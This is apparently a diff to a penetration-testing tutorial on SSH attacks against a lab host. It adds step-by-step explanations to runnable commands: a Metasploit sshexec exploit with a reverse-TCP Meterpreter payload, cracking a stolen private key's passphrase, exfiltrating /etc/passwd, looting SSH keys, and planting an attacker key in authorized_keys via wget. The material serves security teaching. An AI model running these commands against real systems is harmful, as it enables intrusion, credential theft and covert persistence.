@@ -567,27 +567,87 @@ Metasploit's `exploit/multi/ssh/sshexec` module takes a different approach: it a
 sudo msfconsole -q
 ```
 
-The `-q` flag starts the Metasploit console quietly without printing the random ASCII banner, dropping us straight into the `msf6 >` prompt. From there, we select the `exploit/multi/ssh/sshexec` module and configure the target address, credentials, target architecture index, payload, and local listener IP:
+The `-q` flag starts the Metasploit console quietly without printing the random ASCII banner, dropping us straight into the `msf6 >` prompt. Inside that console we first select the module:
 
 ```bash
 use exploit/multi/ssh/sshexec
-set rhosts 192.168.1.9
-set username pentest
-set password 123
-set target 1
-set payload linux/x86/meterpreter/reverse_tcp
-set lhost 192.168.1.17
 ```
 
 **Output:**
 
 ```text
 [*] No payload configured, defaulting to cmd/linux/http/x64/meterpreter/reverse_tcp
+```
+
+Metasploit confirms the module is loaded and warns that it has defaulted to a command stager until we choose a payload. Now we point it at the target address we recovered earlier:
+
+```bash
+set rhosts 192.168.1.9
+```
+
+**Output:**
+
+```text
 rhosts => 192.168.1.9
+```
+
+The `set name value` form assigns one option, and the console echoes the assignment back so you can see exactly what took effect. Next, the login name:
+
+```bash
+set username pentest
+```
+
+**Output:**
+
+```text
 username => pentest
+```
+
+…and the password:
+
+```bash
+set password 123
+```
+
+**Output:**
+
+```text
 password => 123
+```
+
+The `target` option selects the platform-specific exploit variant. Index `1` is the 32-bit Linux x86 target:
+
+```bash
+set target 1
+```
+
+**Output:**
+
+```text
 target => 1
+```
+
+The payload architecture must match the chosen target, so we pair the x86 target with an x86 Meterpreter payload:
+
+```bash
+set payload linux/x86/meterpreter/reverse_tcp
+```
+
+**Output:**
+
+```text
 payload => linux/x86/meterpreter/reverse_tcp
+```
+
+Finally, `lhost` is the attacker address the payload should connect back to:
+
+```bash
+set lhost 192.168.1.17
+```
+
+**Output:**
+
+```text
 lhost => 192.168.1.17
 ```
 
@@ -1104,6 +1164,8 @@ John the Ripper cannot read an OpenSSH private key file directly; it works with 
 ssh2john id_rsa > sshhash
 ```
 
+The conversion is silent on success: `ssh2john` writes the hash into the redirected file rather than printing it. We read that file back with `cat` to inspect the line it produced:
+
 ```bash
 cat sshhash
 ```
@@ -1132,6 +1194,8 @@ The wordlist used here is `rockyou.txt`, a collection of roughly fourteen millio
 ```bash
 gunzip /usr/share/wordlists/rockyou.txt.gz
 ```
+
+The decompression produces no visible output when it succeeds, leaving `rockyou.txt` in place. With the wordlist ready, John is pointed at it with `-w` and the hash file is the final argument:
 
 ```bash
 john -w=/usr/share/wordlists/rockyou.txt sshhash
@@ -1179,6 +1243,8 @@ id_rsa:123
 1 password hash cracked, 0 left
 ```
 
+With the passphrase now known, the same stolen key can be used to log in for real:
+
 ```bash
 ssh -i id_rsa pentest@192.168.1.9
 ```
@@ -1211,6 +1277,8 @@ NetExec's `--put-file` takes a local path and a remote path, authenticates, and 
 ```bash
 echo "staging marker from the assessment team" > file.txt
 ```
+
+The `echo` redirection creates the harmless local file silently, giving us something to upload. We then hand NetExec the local source and the remote destination:
 
 ```bash
 nxc ssh 192.168.1.9 -u pentest --key-file key -p 123 --put-file file.txt /tmp/file.txt
@@ -1255,6 +1323,8 @@ nxc ssh 192.168.1.9 -u pentest --key-file key -p 123 --get-file /etc/passwd pass
 [+] SSH         192.168.1.9    22     192.168.1.9     File "/etc/passwd" was downloaded to "passwd"
 ```
 
+On the attacker's disk the file is now the local `passwd`; `tail` prints its last three lines to show what was recovered:
+
 ```bash
 tail -3 passwd
 ```
@@ -1285,6 +1355,8 @@ scp -i key file.txt pentest@192.168.1.9:/home/pentest/
 Enter passphrase for key 'key': 
 file.txt                               100%   39     0.4KB/s   00:00    
 ```
+
+The upload completed, so we now reverse the direction and pull `/etc/passwd` back down, renaming it locally so it does not overwrite the copy obtained a moment earlier:
 
 ```bash
 scp -i key pentest@192.168.1.9:/etc/passwd ./passwd-scp
@@ -1322,9 +1394,13 @@ ssh pentest@192.168.1.9 'cat /etc/hostname'
 ubuntu-lab
 ```
 
+A one-line file is the easy case; binary or control-character-laden files need encoding. `base64` wraps the file so it survives the channel, and the local pipe decodes it:
+
 ```bash
 ssh pentest@192.168.1.9 'base64 /etc/passwd' | base64 -d > passwd-manual
 ```
+
+The decode writes silently into `passwd-manual`. We confirm the transfer worked by counting its lines:
 
 ```bash
 wc -l passwd-manual
@@ -1336,11 +1412,15 @@ wc -l passwd-manual
 47 passwd-manual
 ```
 
+Downloading works, so we try the reverse by hand: a here-document feeds local text to the remote `cat`, which writes it to a file:
+
 ```bash
 ssh pentest@192.168.1.9 'cat > /tmp/note.txt' <<'EOF'
 checking whether an upload works over a plain SSH session
 EOF
 ```
+
+The upload is silent on success, so we read the file back to prove it landed:
 
 ```bash
 ssh pentest@192.168.1.9 'cat /tmp/note.txt'
@@ -1367,16 +1447,35 @@ The common thread through all four subsections is that the ability to run as `pe
 
 ## 10. Post-exploitation — harvesting SSH credentials
 
-Everything we have done by hand so far — find the key, copy it out, crack the passphrase — can be reduced to two commands once a Meterpreter session exists. The post-exploitation module `post/multi/gather/ssh_creds` walks every user's home directory on the compromised host, collects the contents of each `.ssh` directory it can read, and stores the results in the attacker's loot directory.
+Everything we have done by hand so far — find the key, copy it out, crack the passphrase — can be reduced to a handful of commands once a Meterpreter session exists. The post-exploitation module `post/multi/gather/ssh_creds` walks every user's home directory on the compromised host, collects the contents of each `.ssh` directory it can read, and stores the results in the attacker's loot directory.
 
 Its value is not that it does anything a human could not; it is that it does it in seconds, across every account on the machine, before anyone notices.
 
 ```bash
-msf6 > use post/multi/gather/ssh_creds
-msf6 post(multi/gather/ssh_creds) > set session 1
-session => 1
-msf6 post(multi/gather/ssh_creds) > run
+use post/multi/gather/ssh_creds
+```
 
+The command loads the post-exploitation module and prints nothing; only the console prompt changes to show it. We then point the module at the session opened in section 5.3:
+
+```bash
+set session 1
+```
+
+**Output:**
+
+```text
+session => 1
+```
+
+With the session bound, the module is ready to run. All interactive prompts are omitted from the transcripts here and throughout: only the commands themselves are shown, one per block.
+
+```bash
+run
+```
+
+**Output:**
+
+```text
 [*] Finding .ssh directories
 [*] Looting 1 .ssh directories
 [*] Looting /home/pentest/.ssh directory
@@ -1409,9 +1508,13 @@ Turning the loot back into an authenticated session is a two-command affair.
 mv /root/.msf4/loot/20260111104211_default_192.168.1.9_ssh.id_rsa_115476.txt key
 ```
 
+The rename is silent; the loot file is now simply `key`. The client will refuse a world-readable private key, so we lock it down to `0600` first:
+
 ```bash
 chmod 600 key
 ```
+
+`chmod` also prints nothing on success. With the permissions corrected, the key can finally be used:
 
 ```bash
 ssh -i key pentest@192.168.1.9
@@ -1497,6 +1600,8 @@ curl -s http://127.0.0.1:8080/ | head -5
 </head>
 <body>
 ```
+
+The tunnel clearly works from the attacker's side; the local socket list confirms it as well:
 
 ```bash
 ss -tlnp | grep 8080
@@ -1591,6 +1696,8 @@ The usual follow-up, once the shell is up, is to turn it into a proper terminal,
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
+The `pty` module starts a real pseudo-terminal for the shell, which restores the job control, tab completion and editor support that the raw socket lacked.
+
 <details>
 <summary><strong>Read more</strong> — the `rlwrap` nicety, the fragility, and the signature</summary>
 
@@ -1638,9 +1745,13 @@ The key's randomart image is:
 +----[SHA256]-----+
 ```
 
+The new key pair was written where we asked. We move into the directory that holds it to inspect the files and publish the public half:
+
 ```bash
 cd .ssh
 ```
+
+The `cd` prints nothing; listing the directory shows the two new files:
 
 ```bash
 ls -al
@@ -1655,6 +1766,8 @@ drwx------ 4 root root 4096 Jan 11 10:50 ..
 -rw------- 1 root root  464 Jan 11 10:52 id_ed25519
 -rw-r--r-- 1 root root  100 Jan 11 10:52 id_ed25519.pub
 ```
+
+The private key is 464 bytes and the public key 100. We print the public key because that single line is what has to reach the target:
 
 ```bash
 cat id_ed25519.pub
@@ -1689,6 +1802,8 @@ updog -p 80
 cd .ssh
 ```
 
+The `cd` is silent. `wget` then fetches the attacker's public key over HTTP and saves it locally:
+
 ```bash
 wget http://192.168.1.17/id_ed25519.pub -O attacker_key.pub
 ```
@@ -1707,9 +1822,13 @@ attacker_key.pub                      100%[=====================================
 2024-01-11 10:54:02 (12.3 MB/s) - 'attacker_key.pub' saved [100/100]
 ```
 
+The download succeeded. We grant it access by appending it to the account's trust file:
+
 ```bash
 cat attacker_key.pub >> authorized_keys
 ```
+
+Appending the key is silent by design. Listing the directory afterwards shows the file has grown:
 
 ```bash
 ls -al
